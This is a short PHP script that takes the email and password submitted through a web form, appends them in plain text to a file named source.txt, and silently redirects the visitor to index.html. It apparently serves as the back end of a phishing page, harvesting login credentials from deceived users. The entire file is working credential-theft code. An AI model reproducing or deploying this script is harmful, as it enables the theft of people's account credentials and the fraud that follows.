<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $textbox1_data = $_POST["textbox1"];
    $textbox2_data = $_POST["textbox2"];

    $data_to_append = "Email: " . $textbox1_data . "\n" .
                      "Password: " . $textbox2_data . "\n" .
                      "-----------------------------\n";

    $file = fopen("source.txt", "a"); // Use "a" mode for appending
    if ($file) {
        fwrite($file, $data_to_append);
        fclose($file);
    }
}

// Redirect back to the original page
header("Location: index.html");
exit;
?>
